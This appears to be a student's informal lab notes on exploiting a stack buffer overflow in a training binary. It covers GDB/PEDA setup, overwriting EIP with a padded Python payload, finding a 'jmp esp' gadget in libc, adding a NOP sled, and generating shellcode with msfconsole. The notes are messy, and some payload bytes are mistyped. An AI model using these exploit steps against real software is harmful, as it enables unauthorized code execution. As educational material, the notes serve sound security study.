# Buffer Overflow DEFENSES
-  Non executable (NX) stack: a defense ttactic against :: BO

- Address Space Layout Randomization (ASLR) :: we have a script for this tomorrow 

- Data Execution Prevention (DEP)
- Stack Canaries
- Position Independent Executable (PIE)
--------------------------------------------------------------------------


# GDB Uses
instal :: git clone https://github.com/longld/peda.git ~/peda
install :: echo "source ~/peda/peda.py" >> ~/.gdbinit

Common Commands
walkthrough :: disass <FUNCTION>   #   Disassemble portion of the program
info <...>  #   Supply info for specific stack areas
x/256c $<REGISTER>  #   Read characters from specific register
break <address>  #   Establish a break point

------------------------------------------------------------
CAN WE PUT FILES IN???
  GETS // PUTS 
chmod 
gdb func 
  run 
  quit 
 run <<< $(python test.py) //

       
this is clearing the buffer :: 0x5655557b <+4>:	sub    esp,0x44
  we overflow it 
  
buffer = "A" * 62
eip = ("bbbb")
print(buffer + eip)


env - gdb func :: set eniv var 
  show env 
  now we remove the variables 
unset env XXX
  crash it (type RUN) 
  overflow it with AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  LOOK FOR :: Program received signal SIGSEGV, Segmentation fault.
  info proc map (LOOKING FOR FIRST/LAST COLUMN VALUE FOR HEAP) 

  start at the bottom of the heap and go down 
  find /b 0x
  find /b 0xf7de1000 , 0xf7ffd000, start and finish searching 
  0xff, 0xe4 this is jump 

  find /b 0xf7de1000 , 0xf7ffd000, 0xff, 0xe4

  get the first three and put them in the script 

  0xf7de3b59
0xf7f588ab
0xf7f645fb

buffer = "A" * 62
# eip = ("bbbb")  
eip = ("bbbb")
#0xf7de3b59 "\xf7\xde\x3b\x59" "\x59\x3b\xde\f7"
#0xf7f588ab "\xab\x88\xf5\xf7"
#0xf7f645fb "\xfb\x45\xf6\xf7" 

print(buffer + eip)


buffer = "A" * 62
# eip = ("bbbb")
eip = "\x59\x3b\xde\f7"
#0xf7de3b59 "\xf7\xde\x3b\x59" "\x59\x3b\xde\f7"
#0xf7f588ab "\xab\x88\xf5\xf7"
#0xf7f645fb "\xfb\x45\xf6\xf7" 
nop = '\x90' * 5
print(buffer + eip)

 ### after changing this and inputing my program didnt break and i lost it here use 


  msfconsole :: 
-------------------------------------------------
use payload/linux/x86/exec
  show options
set CMD W
generate -b "\x00" -f python
 ------------------------------------------------

#trying it myself 

  chmod the file 
  gdb (the file) run 
  see what happens 
  gdb :: pdisass (look for vulnerabilities)
  look for a volunerabil function fgets ets you put files in 
  gets lets user input 
  gdb :: disass main 
  gdb :: disass functions 
  gdb :: disass gets /puts 
  look for sub esp 	:: sub    esp,0x1c == place to start buffer overflow 68 A 
  incriment by one to overflow
  
vim exploit.py
---------------------------------------  
buffer = "A" * 76
eip = ("bbbb")
shellcode = (buffer + eip)
---------------------------------------
 until the eip has my 4 bbbb 
  
FROM A BOX 
  LINOPS:: env - gdb (THEPROGRAM) 
show env 
  now we remove the variables 
unset env XXX
  crash it (type RUN) 
  overflow it with AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  LOOK FOR :: Program received signal SIGSEGV, Segmentation fault.
  info proc map (LOOKING FOR FIRST/LAST COLUMN VALUE FOR HEAP) 
  find /b 0xf7de1000 , 0xf7ffd000, 0xff, 0xe4

  PICK THE TOP 3 RETURNS 
  0xf7de3b59
0xf7f588ab
0xf7f645fb
0xf7f6460f

  INTO THE SCRIPT :: 
  eip = "\x59\x3b\xde\f7"
#0xf7de3b59 "\xf7\xde\x3b\x59" "\x59\x3b\xde\f7"
#0xf7f588ab "\xab\x88\xf5\xf7"
#0xf7f645fb "\xfb\x45\xf6\xf7" 
nop = '\x90' * 5

  COMMENT OUT THE PREVIOUS EIP 

 msfconsole :: 
-------------------------------------------------
use payload/linux/x86/exec
  show options
set CMD W
generate -b "\x00" -f python
 ------------------------------------------------
  
find /b 0xf7def000, 0xffffe000, 0xff, 0xe4
0xf7df1b51
0xf7f6674b
0xf7f72753
  
